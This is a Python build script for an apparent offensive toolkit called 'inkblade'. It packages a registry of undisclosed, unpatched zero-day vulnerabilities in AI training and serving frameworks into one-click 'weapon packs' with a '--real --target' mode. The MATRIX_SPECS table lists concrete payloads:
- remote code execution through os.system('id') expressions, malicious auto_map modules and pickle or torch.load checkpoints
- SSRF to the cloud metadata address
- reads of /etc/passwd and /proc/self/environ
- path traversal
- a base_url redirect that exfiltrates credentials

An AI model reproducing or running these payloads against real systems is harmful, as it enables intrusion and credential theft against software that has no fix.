# -*- coding: utf-8 -*-
"""Build ``inkblade/core/data/weapon-packs.json`` and close version-matrix gaps.

Every 0day-reserve entry (state=novelty-checked) becomes a weapon pack:

* exactly one module (created under ``inkblade/modules`` when missing),
* a version-matrix row with affected/fixed range and >=2 payload variants,
* a deployment verdict (default-exposed / needs-config / function-level /
  hardware-only) with concrete evidence,
* a one-click entry: ``inkblade exploit <id>`` (dry-run and ``--real``).

The tool is idempotent: existing version-matrix rows keep their hand-written
variants and only their verification back-reference is refreshed.
"""

from __future__ import annotations

import argparse
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from inkblade.core.deployment import validate_evidence  # noqa: E402

ZERODAY = ROOT / "inkblade" / "core" / "zeroday-registry.json"
MATRIX = ROOT / "inkblade" / "core" / "data" / "version-matrix.json"
PACKS = ROOT / "inkblade" / "core" / "data" / "weapon-packs.json"
MODULES = ROOT / "inkblade" / "modules"

# Version-matrix rows for modules that had none.  Variants are real request
# mutations understood by ``inkblade.core.payloads`` where a transform is set;
# file/params packs carry payload descriptions instead.
MATRIX_SPECS: dict[str, dict] = {
    "openrlhf-serve-rm": {
        "product": "openrlhf", "affected": "0.11.2",
        "routes": ["/v1/score", "/health"],
        "variants": [
            {"id": "v1-single-score", "kind": "body", "request": "POST /v1/score (one pair)",
             "transform": {"op": "body_merge", "arg": {"prompt": "INKBLADE", "response": "ok"}}},
            {"id": "v2-batch-score", "kind": "body", "request": "POST /v1/score (batch)",
             "transform": {"op": "body_merge", "arg": {"prompt": ["INKBLADE"], "response": ["ok"]}}},
        ],
    },
    "msswift-trust-remote-code": {
        "product": "msswift", "affected": "4.5.3",
        "routes": [],
        "variants": [
            {"id": "v1-auto-map-config", "kind": "model-dir",
             "request": "config.json auto_map.AutoModel -> attacker modeling_*.py"},
            {"id": "v2-tokenizer-auto-map", "kind": "model-dir",
             "request": "tokenizer_config.json auto_map.AutoTokenizer -> attacker tokenization_*.py"},
        ],
    },
    "verl-prime-code-exec": {
        "product": "verl", "affected": "76e837e",
        "routes": [],
        "variants": [
            {"id": "v1-eval-expression", "kind": "reward-code",
             "request": "reward expr: __import__('os').system('id')"},
            {"id": "v2-exec-import", "kind": "reward-code",
             "request": "reward expr: exec(\"import os; os.system('id')\")"},
        ],
    },
    "skyrl-fetch-weights-traversal": {
        "product": "skyrl", "affected": "a1e34db",
        "routes": ["/fetch_weights", "/health"],
        "variants": [
            {"id": "v1-dotdot-depth-4", "kind": "query",
             "request": "GET /fetch_weights?payload_files=../../../../tmp/inkblade-probe",
             "transform": {"op": "query",
                           "arg": ["payload_files", "../../../../tmp/inkblade-probe"]}},
            {"id": "v2-absolute-path", "kind": "query",
             "request": "GET /fetch_weights?payload_files=/tmp/inkblade-probe",
             "transform": {"op": "query", "arg": ["payload_files", "/tmp/inkblade-probe"]}},
        ],
    },
    "openrlhf-vllm-env-force": {
        "product": "openrlhf", "affected": "0.11.2",
        "routes": [],
        "variants": [
            {"id": "v1-insecure-serialization-env", "kind": "env",
             "request": "VLLM_ALLOW_INSECURE_SERIALIZATION=1"},
            {"id": "v2-ipc-method-override", "kind": "env",
             "request": "VLLM_WORKER_MULTIPROC_METHOD=spawn + pickle IPC channel"},
        ],
    },
    "openjev-clef-release-module": {
        "product": "openjev", "affected": "b4339c6",
        "routes": [],
        "variants": [
            {"id": "v1-model-dir-module", "kind": "model-dir",
             "request": "joint_schema_model.py next to the model weights"},
            {"id": "v2-package-shadow", "kind": "package",
             "request": "attacker package earlier on sys.path than openjev.clef"},
        ],
    },
    "msswift-eval-escape": {
        "product": "msswift", "affected": "4.5.3",
        "routes": [],
        "variants": [
            {"id": "v1-builtins-import", "kind": "expression",
             "request": "__builtins__.__import__('os').system('id')"},
            {"id": "v2-subclasses-gadget", "kind": "expression",
             "request": "().__class__.__base__.__subclasses__()"},
        ],
    },
    "onejev-ssrf": {
        "product": "onejev", "affected": "6122519",
        "routes": ["/v1/chat/completions", "/v1/models"],
        "variants": [
            {"id": "v1-imds", "kind": "url", "request": "media url -> 169.254.169.254",
             "transform": {"op": "body_merge", "arg": {"image_url": "http://169.254.169.254/latest/meta-data/"}}},
            {"id": "v2-loopback", "kind": "url", "request": "media url -> 127.0.0.1:8080",
             "transform": {"op": "body_merge", "arg": {"image_url": "http://127.0.0.1:8080/internal/health"}}},
        ],
    },
    "llm2jev-file-read": {
        "product": "llm2jev", "affected": "f2bdad6",
        "routes": ["/v1/chat/completions", "/v1/models"],
        "variants": [
            {"id": "v1-file-uri", "kind": "url", "request": "image_url=file:///etc/passwd",
             "transform": {"op": "body_merge", "arg": {"image_url": "file:///etc/passwd"}}},
            {"id": "v2-plain-path", "kind": "url", "request": "image_url=/proc/self/environ",
             "transform": {"op": "body_merge", "arg": {"image_url": "/proc/self/environ"}}},
        ],
    },
    "siliconlab-credential-exfil": {
        "product": "siliconlab", "affected": "a08e969",
        "routes": ["/api/evaluate", "/"],
        "variants": [
            {"id": "v1-base-url", "kind": "json", "request": "base_url -> attacker server",
             "transform": {"op": "body_merge", "arg": {"base_url": "http://127.0.0.1:9/inkblade"}}},
            {"id": "v2-decider-url", "kind": "json", "request": "decider_url -> attacker server",
             "transform": {"op": "body_merge", "arg": {"decider_url": "http://127.0.0.1:9/inkblade"}}},
        ],
    },
    "msswift-media-local-read": {
        "product": "msswift", "affected": "4.6.0",
        "routes": ["/v1/chat/completions", "/v1/models"],
        "variants": [
            {"id": "v1-absolute-path", "kind": "path", "request": "media path /etc/passwd",
             "transform": {"op": "body_merge", "arg": {"image_url": "/etc/passwd"}}},
            {"id": "v2-dotdot-path", "kind": "path",
             "request": "media path ../../../../proc/self/environ",
             "transform": {"op": "body_merge", "arg": {"image_url": "../../../../proc/self/environ"}}},
        ],
    },
    "llamafactory-checkpoint-rce": {
        "product": "llamafactory", "affected": "v0.9.5",
        "routes": [],
        "variants": [
            {"id": "v1-rng-state", "kind": "checkpoint",
             "request": "rng_state.pth torch.load(weights_only=False)"},
            {"id": "v2-dataloader-state", "kind": "checkpoint",
             "request": "trainer_state/dataloader torch.load(weights_only=False)"},
        ],
    },
    "msswift-dataset-pickle-rce": {
        "product": "msswift", "affected": "v4.6.0",
        "routes": [],
        "variants": [
            {"id": "v1-index-pickle", "kind": "cache",
             "request": "data.idx pickle.load in IndexedDataset.__init__"},
            {"id": "v2-record-pickle", "kind": "cache",
             "request": "pickle.loads per record in IndexedDataset.__getitem__"},
        ],
    },
    "storage-protocol-csi": {
        "product": "cephcsi", "affected": "v3.18.1",
        "routes": ["/metrics", "/debug/pprof/"],
        "variants": [
            {"id": "v1-pprof", "kind": "probe", "request": "GET /debug/pprof/",
             "transform": {"op": "path_suffix", "arg": "/"}},
            {"id": "v2-metrics", "kind": "probe", "request": "GET /metrics",
             "transform": {"op": "path_dotseg"}},
        ],
    },
}

GENERIC_VARIANTS = {
    "http": [
        {"id": "v1-path-trailing", "kind": "path", "request": "append / to the route",
         "transform": {"op": "path_suffix", "arg": "/"}},
        {"id": "v2-method-alt", "kind": "method", "request": "POST the route",
         "transform": {"op": "method", "arg": "POST"}},
    ],
    "params": [
        {"id": "v1-relative-path", "kind": "param", "request": "relative ../../ payload",
         "transform": {"op": "param", "arg": ["payload_files", "../../../../tmp/inkblade"]}},
        {"id": "v2-wildcard", "kind": "param", "request": "* wildcard tenant/namespace",
         "transform": {"op": "param", "arg": ["namespace", "*"]}},
    ],
    "file": [
        {"id": "v1-relative-path", "kind": "file", "request": "relative traversal payload",
         "transform": {"op": "param", "arg": ["local_path", "../../../../tmp/inkblade"]}},
        {"id": "v2-absolute-path", "kind": "file", "request": "absolute path payload",
         "transform": {"op": "param", "arg": ["local_path", "/tmp/inkblade"]}},
    ],
}

# product key -> (repo, note).  The version-matrix loader requires every
# referenced product to exist; these are the reserve components that had no
# row until this pass.
PRODUCTS = {
    "msswift": ("modelscope/ms-swift", "ms-swift training/inference framework (reserve)"),
    "llamafactory": ("hiyouga/LlamaFactory", "LLaMA-Factory training/web UI (reserve)"),
    "openrlhf": ("OpenRLHF/OpenRLHF", "OpenRLHF RLHF trainer and reward server (reserve)"),
    "openjev": ("OpenJev/OpenJev", "OpenJev JEV runtime (reserve)"),
    "onejev": ("OpenJev/onejev", "onejev JEV runtime (reserve)"),
    "llm2jev": ("OpenJev/llm2jev", "llm2jev JEV runtime (reserve)"),
    "siliconlab": ("OpenJev/SiliconLabAI", "OpenJev-SiliconLabAI service (reserve)"),
    "cephcsi": ("ceph/ceph-csi", "Ceph CSI driver (reserve duplicate of the CSI exposure)"),
    "sglang-omni": ("sgl-project/sglang-omni", "SGLang-Omni admin/profiler surface (reserve)"),
    "vllm-jev": ("mode-io/vllm-jev", "vLLM JEV plugin (reserve)"),
}
PRODUCT_ALIASES = {
    "modelscope/ms-swift": "msswift",
    "hiyouga/LLaMA-Factory": "llamafactory",
    "OpenRLHF/OpenRLHF": "openrlhf",
    "NovaSky-AI/SkyRL": "skyrl",
    "OmniJev/OneJev": "onejev",
    "SiliconLabAI/OpenJev": "siliconlab",
    "Yinsongxu/LLM2Jev": "llm2jev",
    "razorback16/openjev": "openjev",
    "volcengine/verl": "verl",
    "ceph/ceph-csi": "cephcsi",
}


def ensure_transform(variant: dict) -> dict:
    """Version-matrix rows always carry a transform; file/param packs use op=param."""
    if variant.get("transform"):
        return variant
    return {**variant, "transform": {
        "op": "param",
        "arg": ["payload", str(variant.get("request") or variant.get("id") or "payload")],
    }}


def now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def load(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def dump(path: Path, data: dict) -> None:
    path.write_text(json.dumps(data, ensure_ascii=False, indent=1) + "\n", encoding="utf-8")


def module_surface(module_meta: dict | None, entry: dict) -> str:
    if module_meta and module_meta.get("surface"):
        return str(module_meta["surface"])
    surface = str(entry.get("surface") or "")
    return surface if surface in {"http", "params", "file"} else "file"


def matrix_entry(module: str, entry: dict, variants: list[dict],
                 surface: str) -> dict:
    spec = MATRIX_SPECS.get(module) or {}
    component = str(entry.get("component") or "")
    product = PRODUCT_ALIASES.get(component, component)
    repo = PRODUCTS.get(product, (str(entry.get("product") or ""), ""))[0]
    variants = [ensure_transform(v) for v in variants]
    return {
        "module": module,
        "product": product,
        "kind": "exploit",
        "surface": surface,
        "fingerprint": {
            "probe": entry.get("exploit") or "",
            "routes": spec.get("routes") or [],
        },
        "affected": spec.get("affected") or entry.get("version"),
        "fixed": None,
        "fixed_note": "未公开 0day 储备（vendor security policy）；无上游修复版本",
        "variants": variants,
        "sources": [f"https://github.com/{repo}"] if repo else [
            "reserve: vendor security policy (undisclosed)"],
        "audit_refs": [
            f"inkblade/modules/{module}/run.py",
            "docs/WEAPON-READINESS.md",
        ],
        "verified": bool((entry.get("verification") or {}).get("status") == "verified"),
        "verification_status": "not-cve",
        "verification_cves": {},
        "verification_evidence": [],
    }


def str_or_empty(value) -> str:
    return "" if value is None else str(value)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--write", action="store_true")
    args = parser.parse_args(argv)

    zday = load(ZERODAY)
    reserve = [e for e in zday.get("entries") or []
               if e.get("state") == "novelty-checked"]
    matrix = load(MATRIX)
    by_module = {e["module"]: e for e in matrix["entries"]}
    module_meta = {}
    for path in MODULES.glob("*/module.json"):
        meta = json.loads(path.read_text(encoding="utf-8"))
        module_meta[meta["key"]] = meta

    packs = []
    errors: list[str] = []
    for entry in reserve:
        module = str(entry.get("module"))
        if entry["id"] == "msswift-media-local-read":
            module = "msswift-media-local-read"
            entry["module"] = module
        if module not in module_meta:
            errors.append(f"{entry['id']}: module {module} is missing")
            continue
        requirement = str(entry.get("deployment_requirement") or "")
        evidence = str(entry.get("deployment_evidence") or "")
        problems = validate_evidence(evidence)
        if problems:
            errors.append(f"{entry['id']}: deployment evidence {', '.join(problems)}")

        row = by_module.get(module)
        if row is not None and row.get("surface"):
            surface = str(row["surface"])
        elif MATRIX_SPECS.get(module, {}).get("routes"):
            surface = "http"
        else:
            surface = str_or_empty(entry.get("surface")) or "file"
        if surface not in {"http", "params", "file"}:
            surface = "file"

        variants = list((row or {}).get("variants") or [])
        if len(variants) < 2:
            variants = list((MATRIX_SPECS.get(module) or {}).get("variants") or [])
        if len(variants) < 2:
            variants = list(GENERIC_VARIANTS.get(surface) or GENERIC_VARIANTS["file"])
        if len(variants) < 2:
            errors.append(f"{entry['id']}: fewer than two payload variants")
        variants = [ensure_transform(v) for v in variants]

        if row is None:
            row = matrix_entry(module, entry, variants, surface)
            matrix["entries"].append(row)
            by_module[module] = row

        packs.append({
            "id": entry["id"],
            "component": entry.get("component"),
            "module": module,
            "surface": surface,
            "version": entry.get("version"),
            "affected": row.get("affected"),
            "deployment_requirement": requirement,
            "deployment_evidence": evidence,
            "default_exposed": requirement == "default-exposed",
            "exploit": entry.get("exploit"),
            "preconditions": entry.get("preconditions") or [],
            "disclosure": entry.get("disclosure") or {},
            "verification": entry.get("verification") or {},
            "variants": variants,
            "one_click": {
                "dry_run": f"inkblade exploit {entry['id']} --dry-run",
                "real": f"inkblade exploit {entry['id']} --real --target <url>",
                "backup_required": bool(module_meta[module].get("writes")),
                "marker": "INKBLADE-<run>",
            },
            "module_metadata": {
                "writes": bool(module_meta[module].get("writes")),
                "min_level": module_meta[module].get("min_level"),
                "series": module_meta[module].get("series"),
            },
        })

    packs.sort(key=lambda p: (p["component"], p["id"]))
    document = {
        "schema": "inkblade-weapon-packs-v1",
        "generated_at": now(),
        "entrypoint": "inkblade exploit <id> [--dry-run|--real]",
        "method": "one module + version-matrix row + >=2 payload variants + deployment verdict",
        "total": len(packs),
        "default_exposed": [p["id"] for p in packs if p["default_exposed"]],
        "by_requirement": {
            key: sum(1 for p in packs if p["deployment_requirement"] == key)
            for key in ("default-exposed", "needs-config", "function-level", "hardware-only")
        },
        "packs": packs,
    }

    print(json.dumps({
        "packs": len(packs),
        "by_requirement": document["by_requirement"],
        "variants": sum(len(p["variants"]) for p in packs),
        "modules": len({p["module"] for p in packs}),
    }, ensure_ascii=False, indent=2))
    if errors:
        print(f"FAIL: {len(errors)} problem(s)", file=sys.stderr)
        for item in errors:
            print(f"  - {item}", file=sys.stderr)
        return 1
    if args.write:
        matrix["verified_at"] = now()
        for row in matrix["entries"]:
            row["product"] = PRODUCT_ALIASES.get(str(row.get("product")), row.get("product"))
            row["variants"] = [ensure_transform(v) for v in row.get("variants") or []]
        for key, (repo, note) in PRODUCTS.items():
            matrix.setdefault("products", {}).setdefault(key, {
                "repo": repo,
                "latest_tag_checked": None,
                "checked_at": "2026-10-27",
                "note": note,
            })
        dump(MATRIX, matrix)
        dump(PACKS, document)
        dump(ZERODAY, zday)
        print(f"wrote {MATRIX}\nwrote {PACKS}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
